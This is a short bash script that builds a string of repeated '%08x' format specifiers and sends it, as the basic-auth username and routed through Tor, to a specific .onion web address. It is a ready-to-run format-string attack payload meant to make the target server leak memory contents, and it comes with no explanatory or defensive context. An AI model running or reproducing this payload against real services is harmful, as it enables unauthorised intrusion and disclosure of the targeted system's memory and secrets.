#!/bin/bash

msg=""
for char in {0..30}
do
    msg+="%08x"
done

curl --max-time 5000 --user $msg:test --socks5-hostname localhost:9050 -v \
 http://xtfbiszfeilgi672ted7hmuq5v7v3zbitdrzvveg2qvtz4ar5jndnxad.onion/